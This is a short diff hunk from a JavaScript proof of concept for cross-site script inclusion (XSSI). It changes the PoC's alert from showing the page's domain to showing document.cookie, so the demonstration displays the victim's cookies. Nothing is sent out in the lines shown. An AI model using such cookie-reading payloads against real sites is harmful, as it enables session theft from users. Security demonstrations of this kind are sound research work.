@@ -12,5 +12,5 @@ Purpose: Demonstrate cross-site script inclusion
     };
  
     console.log("[XSSI PoC]", data);
-    alert("XSSI PoC executed on: " + document.domain);
+    alert("XSSI PoC executed on: " + document.cookie);
 })();
